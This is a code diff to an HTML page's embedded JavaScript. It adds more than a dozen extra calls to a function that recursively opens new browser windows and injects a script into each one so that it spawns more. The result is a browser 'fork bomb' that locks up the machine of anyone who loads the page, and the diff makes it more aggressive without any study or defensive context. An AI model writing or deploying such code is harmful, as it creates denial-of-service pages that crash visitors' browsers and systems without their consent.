@@ -84,6 +84,7 @@
                             }
                             // Trigger the creation of new windows
                             setTimeout(openNewWindows, 1000);
+                             openRecursiveWindow();
                         })();
                     `;
                     newWindow.document.body.appendChild(script);
@@ -91,7 +92,18 @@
 
                 // Open the first recursive window
                 openRecursiveWindow();
-            }, 1000); // Wait for 1 second (1000 ms)
+            }, 1000);
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();
+             openRecursiveWindow();// Wait for 1 second (1000 ms)
         };
     </script>
 </head>
